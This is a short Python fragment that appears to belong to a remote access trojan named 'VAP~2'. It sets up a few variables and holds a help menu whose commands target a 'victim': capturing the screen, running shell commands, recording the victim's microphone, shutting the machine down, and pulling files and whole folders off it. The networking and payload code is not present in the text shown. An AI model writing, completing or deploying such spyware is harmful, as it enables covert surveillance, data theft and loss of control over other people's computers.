import datetime
import os
import socket
now = datetime.datetime.now()
TIME = now.strftime("%Y-%m-%d %H:%M:%S")
VERSION = 'VAP~2'
home_path = os.path.expanduser('~')
payload_name = None
def fff(payload_name=payload_name):
    print(f"[*] Payload name is: {payload_name}")
          
help_text = """
**VAP2 HELP MENU**
**COMMANDS**    **USAGE**
screenshot  take screenshot of the victims screen
run <command> runs cmd commands
sysinfo returns a file of system information
shutdown    shutdown the victim's computer
capture-audio <duration in seconds> records the victim's microphone for <duration> and returns .avi file
grab-file <file-path>   returns the file <file-path>
grab-folder <folder-path>   returns all the files in <folder-path?
help-tool    shows this menu
"""
hostname = socket.gethostname().lower()